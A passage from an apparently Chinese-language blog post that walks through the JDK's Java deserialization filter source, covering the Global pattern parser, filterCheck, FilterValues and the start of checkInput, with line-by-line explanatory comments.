<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 基于 pattern 字符串构造过滤器。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> pattern 分号分隔的规则串</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalArgumentException 当规则格式不合法时</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> UnsupportedOperationException 当没有任何非空规则段（且也没有限制项）时</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="title function_">Global</span><span class="params">(String pattern)</span> &#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">hasLimits</span> <span class="operator">=</span> <span class="literal">false</span>;        <span class="comment">// 是否设置过任一限制项（maxdepth/maxrefs/maxbytes/maxarray）</span></span><br><span class="line">    <span class="built_in">this</span>.pattern = pattern;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 四类资源限制的默认值：不限制（Long.MAX_VALUE）</span></span><br><span class="line">    maxArrayLength = Long.MAX_VALUE;</span><br><span class="line">    maxDepth = Long.MAX_VALUE;</span><br><span class="line">    maxReferences = Long.MAX_VALUE;</span><br><span class="line">    maxStreamBytes = Long.MAX_VALUE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 规则按照 &#x27;;&#x27; 切分逐段处理</span></span><br><span class="line">    String[] patterns = pattern.split(<span class="string">&quot;;&quot;</span>);</span><br><span class="line">    filters = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(patterns.length);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; patterns.length; i++) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">p</span> <span class="operator">=</span> patterns[i];</span><br><span class="line">        <span class="type">int</span> <span class="variable">nameLen</span> <span class="operator">=</span> p.length();</span><br><span class="line">        <span class="keyword">if</span> (nameLen == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 跳过空段（例如连续两个 ;;）</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1) 尝试解析“限制项”（形如 maxdepth=..., maxrefs=... 等）</span></span><br><span class="line">        <span class="keyword">if</span> (parseLimit(p)) &#123;</span><br><span class="line">            <span class="comment">// 命中限制项，已在 parseLimit 中更新相应的数值</span></span><br><span class="line">            hasLimits = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2) 非限制项：解析类/包/模块匹配规则</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">negate</span> <span class="operator">=</span> p.charAt(<span class="number">0</span>) == <span class="string">&#x27;!&#x27;</span>; <span class="comment">// 前缀 &#x27;!&#x27; 表示否定（匹配即 REJECTED）</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">poffset</span> <span class="operator">=</span> negate ? <span class="number">1</span> : <span class="number">0</span>;        <span class="comment">// 实际规则起始下标（跳过 &#x27;!&#x27;）</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// —— 可选的模块名前缀 —— 语法：&lt;module&gt;/&lt;class-or-package-pattern&gt;</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">slash</span> <span class="operator">=</span> p.indexOf(<span class="string">&#x27;/&#x27;</span>, poffset);</span><br><span class="line">        <span class="keyword">if</span> (slash == poffset) &#123;</span><br><span class="line">            <span class="comment">// 出现了 &#x27;/&#x27; 但模块名为空：非法</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;module name is missing in: \&quot;&quot;</span> + pattern + <span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">moduleName</span> <span class="operator">=</span> (slash &gt;= <span class="number">0</span>) ? p.substring(poffset, slash) : <span class="literal">null</span>;</span><br><span class="line">        poffset = (slash &gt;= <span class="number">0</span>) ? slash + <span class="number">1</span> : poffset; <span class="comment">// 规则主体移到 &#x27;/&#x27; 之后</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Function&lt;Class&lt;?&gt;, Status&gt; patternFilter;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3) 通配分支：以 &#x27;*&#x27; 结尾的三种情况</span></span><br><span class="line">        <span class="keyword">if</span> (p.endsWith(<span class="string">&quot;*&quot;</span>)) &#123;</span><br><span class="line">            <span class="comment">// 3.1 结尾为 &quot;.*&quot; ：仅匹配“当前包”内的任意类（不含子包）</span></span><br><span class="line">            <span class="keyword">if</span> (p.endsWith(<span class="string">&quot;.*&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">final</span> <span class="type">String</span> <span class="variable">pkg</span> <span class="operator">=</span> p.substring(poffset, nameLen - <span class="number">1</span>); <span class="comment">// 去掉尾部 &#x27;*&#x27;</span></span><br><span class="line">                <span class="keyword">if</span> (pkg.length() &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                    <span class="comment">// 要求至少像 &quot;a.&quot; 这样，裸 &quot;.*&quot; 会视为缺少包名</span></span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;package missing in: \&quot;&quot;</span> + pattern + <span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (negate) &#123;</span><br><span class="line">                    <span class="comment">// 命中则 REJECTED，未命中则 UNDECIDED</span></span><br><span class="line">                    patternFilter = c -&gt; matchesPackage(c, pkg) ? Status.REJECTED : Status.UNDECIDED;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 命中则 ALLOWED，未命中则 UNDECIDED</span></span><br><span class="line">                    patternFilter = c -&gt; matchesPackage(c, pkg) ? Status.ALLOWED : Status.UNDECIDED;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 3.2 结尾为 &quot;.**&quot; ：匹配“包及所有子包”</span></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (p.endsWith(<span class="string">&quot;.**&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">final</span> <span class="type">String</span> <span class="variable">pkgs</span> <span class="operator">=</span> p.substring(poffset, nameLen - <span class="number">2</span>); <span class="comment">// 去掉尾部 &quot;**&quot;</span></span><br><span class="line">                <span class="keyword">if</span> (pkgs.length() &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                    <span class="comment">// 同理，必须存在明确的包前缀，裸 &quot;.**&quot; 非法</span></span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;package missing in: \&quot;&quot;</span> + pattern + <span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (negate) &#123;</span><br><span class="line">                    patternFilter = c -&gt; c.getName().startsWith(pkgs) ? Status.REJECTED : Status.UNDECIDED;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    patternFilter = c -&gt; c.getName().startsWith(pkgs) ? Status.ALLOWED : Status.UNDECIDED;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 3.3 其他以 &#x27;*&#x27; 结尾：按“类名字符串前缀”匹配</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">final</span> <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> p.substring(poffset, nameLen - <span class="number">1</span>); <span class="comment">// 去掉尾部 &#x27;*&#x27;</span></span><br><span class="line">                <span class="comment">// 注意：className 为空字符串时，startsWith(&quot;&quot;) 恒为 true → 匹配任意类</span></span><br><span class="line">                <span class="keyword">if</span> (negate) &#123;</span><br><span class="line">                    patternFilter = c -&gt; c.getName().startsWith(className) ? Status.REJECTED : Status.UNDECIDED;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    patternFilter = c -&gt; c.getName().startsWith(className) ? Status.ALLOWED : Status.UNDECIDED;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 4) 精确匹配：不以 &#x27;*&#x27; 结尾，则视为“完整类名”匹配</span></span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> p.substring(poffset);</span><br><span class="line">            <span class="keyword">if</span> (name.isEmpty()) &#123;</span><br><span class="line">                <span class="comment">// 既没有 &#x27;*&#x27;，又没有具体类名/包名 → 非法</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;class or package missing in: \&quot;&quot;</span> + pattern + <span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (negate) &#123;</span><br><span class="line">                <span class="comment">// 类名完全相等则 REJECTED，否则 UNDECIDED</span></span><br><span class="line">                patternFilter = c -&gt; c.getName().equals(name) ? Status.REJECTED : Status.UNDECIDED;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 类名完全相等则 ALLOWED，否则 UNDECIDED</span></span><br><span class="line">                patternFilter = c -&gt; c.getName().equals(name) ? Status.ALLOWED : Status.UNDECIDED;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5) 若写了 moduleName，则把“模块名判定”与上面的类/包判定组合起来</span></span><br><span class="line">        <span class="keyword">if</span> (moduleName == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 无模块前缀：直接按类/包规则判断</span></span><br><span class="line">            filters.add(patternFilter);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 有模块前缀：模块名相等才继续应用类/包规则；否则 UNDECIDED</span></span><br><span class="line">            filters.add(c -&gt; moduleName.equals(c.getModule().getName())</span><br><span class="line">                             ? patternFilter.apply(c)</span><br><span class="line">                             : Status.UNDECIDED);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6) 如果既没有任何类/包规则（filters 为空），也没有设置任何限制项 → 视为“无非空规则”</span></span><br><span class="line">    <span class="keyword">if</span> (filters.isEmpty() &amp;&amp; !hasLimits) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>(<span class="string">&quot;no non-empty patterns&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h5 id="filterCheck-过滤函数"><a href="#filterCheck-过滤函数" class="headerlink" title="filterCheck 过滤函数"></a>filterCheck 过滤函数</h5><p><code>ObjectInputStream#filterCheck</code> 会对类进行过滤。该函数逻辑为：</p>
<ul>
<li>判断 <code>serialFilter</code> 是否为空</li>
<li>交给 <code>serialFilter#checkInput</code> 进行类检测</li>
<li>若返回状态为 <code>null</code> 或 <code>REJECTED</code>，抛出 <code>InvalidClassException</code> 异常</li>
</ul>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 如果（流级）序列化过滤器不为 null，则调用之。</span></span><br><span class="line"><span class="comment"> * 若过滤器拒绝，或在执行过程中抛出异常，则抛出 InvalidClassException。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> clazz       当前处理的类；可能为 null（例如处理已反序列化对象的引用时）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> arrayLength 请求的数组长度；若非创建数组请传 &#123;<span class="doctag">@code</span> -1&#125;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> InvalidClassException 当被过滤器拒绝、过滤器返回 null，或过滤器抛出 RuntimeException 时抛出</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">filterCheck</span><span class="params">(Class&lt;?&gt; clazz, <span class="type">int</span> arrayLength)</span></span><br><span class="line">        <span class="keyword">throws</span> InvalidClassException &#123;</span><br><span class="line">    <span class="keyword">if</span> (serialFilter != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">RuntimeException</span> <span class="variable">ex</span> <span class="operator">=</span> <span class="literal">null</span>;          <span class="comment">// 缓存过滤器抛出的异常，用作后续 cause</span></span><br><span class="line">        ObjectInputFilter.Status status;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 组装当前反序列化场景的度量信息并调用过滤器：</span></span><br><span class="line">            <span class="comment">//  - clazz：当前类（数组则为数组类型；引用场景为 null）</span></span><br><span class="line">            <span class="comment">//  - arrayLength：数组长度；非数组为 -1</span></span><br><span class="line">            <span class="comment">//  - totalObjectRefs：已从流中读取的对象/引用累计数</span></span><br><span class="line">            <span class="comment">//  - depth：readObject/readUnshared 的嵌套深度</span></span><br><span class="line">            <span class="comment">//  - bin.getBytesRead()：自输入流已消费的字节数（实现相关）</span></span><br><span class="line">            status = serialFilter.checkInput(<span class="keyword">new</span> <span class="title class_">FilterValues</span>(</span><br><span class="line">                    clazz, arrayLength, totalObjectRefs, depth, bin.getBytesRead()));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</span><br><span class="line">            <span class="comment">// 预先拦截过滤器内部抛出的运行时异常：将状态视为 REJECTED，并记录异常用于日志/封装</span></span><br><span class="line">            status = ObjectInputFilter.Status.REJECTED;</span><br><span class="line">            ex = e;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (Logging.filterLogger != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 失败（null 或 REJECTED）打 DEBUG，成功则打 TRACE，便于排查/追踪</span></span><br><span class="line">            Logging.filterLogger.log(</span><br><span class="line">                    status == <span class="literal">null</span> || status == ObjectInputFilter.Status.REJECTED</span><br><span class="line">                            ? Logger.Level.DEBUG</span><br><span class="line">                            : Logger.Level.TRACE,</span><br><span class="line">                    <span class="string">&quot;ObjectInputFilter &#123;0&#125;: &#123;1&#125;, array length: &#123;2&#125;, nRefs: &#123;3&#125;, depth: &#123;4&#125;, bytes: &#123;5&#125;, ex: &#123;6&#125;&quot;</span>,</span><br><span class="line">                    status, clazz, arrayLength, totalObjectRefs, depth, bin.getBytesRead(),</span><br><span class="line">                    Objects.toString(ex, <span class="string">&quot;n/a&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 若过滤器返回 null 或明确拒绝，则抛出 InvalidClassException，并附带原始异常作为 cause</span></span><br><span class="line">        <span class="keyword">if</span> (status == <span class="literal">null</span> || status == ObjectInputFilter.Status.REJECTED) &#123;</span><br><span class="line">            <span class="type">InvalidClassException</span> <span class="variable">ice</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;filter status: &quot;</span> + status);</span><br><span class="line">            ice.initCause(ex);</span><br><span class="line">            <span class="keyword">throw</span> ice;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 其他状态（如 ALLOWED/UNDECIDED）则允许继续反序列化</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>serialFilter#checkInput</code> 的参数是一个 <code>FilterValues</code> 对象（这个类实现了 <code>ObjectInputFilter.FilterInfo</code> 接口）</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 向 ObjectInputFilter 传递的一组“快照”参数。</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;实现 &#123;<span class="doctag">@link</span> ObjectInputFilter.FilterInfo&#125;，封装当前反序列化点的度量信息：</span></span><br><span class="line"><span class="comment"> * &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;&lt;b&gt;clazz&lt;/b&gt;：当前处理的类；处理“已反序列化对象的引用”时可为 &#123;<span class="doctag">@code</span> null&#125;。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;&lt;b&gt;arrayLength&lt;/b&gt;：数组长度；若非数组则为 &#123;<span class="doctag">@code</span> -1&#125;。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;&lt;b&gt;totalObjectRefs&lt;/b&gt;：自流开始以来，已读取的对象与引用的累计数量（含当前）。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;&lt;b&gt;depth&lt;/b&gt;：&#123;<span class="doctag">@code</span> readObject/readUnshared&#125; 的嵌套深度（通常从 1 开始）。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;&lt;b&gt;streamBytes&lt;/b&gt;：自输入流已消费的字节数（实现相关，近似值）。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> * 所有字段均为 &#123;<span class="doctag">@code</span> final&#125;，对象不可变，便于在并发/日志场景安全使用。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">FilterValues</span> <span class="keyword">implements</span> <span class="title class_">ObjectInputFilter</span>.FilterInfo &#123;</span><br><span class="line">    <span class="comment">/** 当前处理的类；数组时为数组类型；仅引用检查时可能为 &#123;<span class="doctag">@code</span> null&#125;。 */</span></span><br><span class="line">    <span class="keyword">final</span> Class&lt;?&gt; clazz;</span><br><span class="line">    <span class="comment">/** 请求创建的数组长度；非数组时为 &#123;<span class="doctag">@code</span> -1&#125;。 */</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">long</span> arrayLength;</span><br><span class="line">    <span class="comment">/** 已从流中读取的对象与引用总数（包含当前即将读取的对象/引用）。 */</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">long</span> totalObjectRefs;</span><br><span class="line">    <span class="comment">/** 当前反序列化调用的嵌套深度。 */</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">long</span> depth;</span><br><span class="line">    <span class="comment">/** 自输入流开始已读取（消费）的字节数（实现相关）。 */</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">long</span> streamBytes;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 使用当前反序列化上下文的度量信息构造快照。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> clazz           当前类；可为 &#123;<span class="doctag">@code</span> null&#125;</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> arrayLength     数组长度；非数组传 &#123;<span class="doctag">@code</span> -1&#125;</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> totalObjectRefs 已读取的对象/引用累计数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> depth           嵌套深度</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> streamBytes     已消费字节数</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">FilterValues</span><span class="params">(Class&lt;?&gt; clazz, <span class="type">long</span> arrayLength, <span class="type">long</span> totalObjectRefs,</span></span><br><span class="line"><span class="params">                        <span class="type">long</span> depth, <span class="type">long</span> streamBytes)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.clazz = clazz;</span><br><span class="line">        <span class="built_in">this</span>.arrayLength = arrayLength;</span><br><span class="line">        <span class="built_in">this</span>.totalObjectRefs = totalObjectRefs;</span><br><span class="line">        <span class="built_in">this</span>.depth = depth;</span><br><span class="line">        <span class="built_in">this</span>.streamBytes = streamBytes;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>前面分析过 <code>serialFilter</code> 实际上是实现 <code>ObjectInputFilter</code> 接口的 <code>Global</code> 类实例化的对象，因此 <code>serialFilter.checkInput</code> 调用的是 <code>Global#checkInput</code> 函数。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 过滤器核心：每读到一个“待创建对象或其片段”，就回调一次。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 判定顺序严格如下：</span></span><br><span class="line"><span class="comment"> *   ① 先做“资源计数/上限”检查：refs/depth/bytes 任一 &lt;0（非法）或超上限 → REJECTED</span></span><br><span class="line"><span class="comment"> *   ② 若有关联类：</span></span><br><span class="line"><span class="comment"> *      - 若是数组：可知长度且超 maxArrayLength → REJECTED；然后把多维数组“降维”到元素类型</span></span><br><span class="line"><span class="comment"> *      - 若是原始类型（primitive）：不决（UNDECIDED）</span></span><br><span class="line"><span class="comment"> *      - 其他引用类型：按 filters 顺序找首个给出明确结论（ALLOWED/REJECTED）的规则</span></span><br><span class="line"><span class="comment"> *   ③ 若无类信息（如写入了特殊标记而非对象）：UNDECIDED</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 返回值只代表“本过滤器”的意见；上层会与“全局过滤器”等做合并：</span></span><br><span class="line"><span class="comment"> *   - 任一返回 REJECTED → 立刻拒绝</span></span><br><span class="line"><span class="comment"> *   - 否则若任一返回 ALLOWED → 放行</span></span><br><span class="line"><span class="comment"> *   - 否则（都 UNDECIDED）→ 由调用方的默认策略继续（通常继续读取）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Status <span class="title function_">checkInput</span><span class="params">(FilterInfo filterInfo)</span> &#123;</span><br><span class="line">    <span class="comment">// —— ① 资源计数/上限的硬性检查（先于类型匹配） ——</span></span><br><span class="line">    <span class="keyword">if</span> (filterInfo.references() &lt; <span class="number">0</span></span><br><span class="line">            || filterInfo.depth() &lt; <span class="number">0</span></span><br><span class="line">            || filterInfo.streamBytes() &lt; <span class="number">0</span></span><br><span class="line">            || filterInfo.references() &gt; maxReferences</span><br><span class="line">            || filterInfo.depth() &gt; maxDepth</span><br><span class="line">            || filterInfo.streamBytes() &gt; maxStreamBytes) &#123;</span><br><span class="line">        <span class="comment">// 任何“非法值”(&lt;0) 或“超限”（&gt;max*）都立即判为 REJECTED</span></span><br><span class="line">        <span class="keyword">return</span> Status.REJECTED;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 待反序列化的“当前类”。某些片段（如 TC_NULL、块数据）没有类信息，会返回 null。</span></span><br><span class="line">    Class&lt;?&gt; clazz = filterInfo.serialClass();</span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// —— ②a 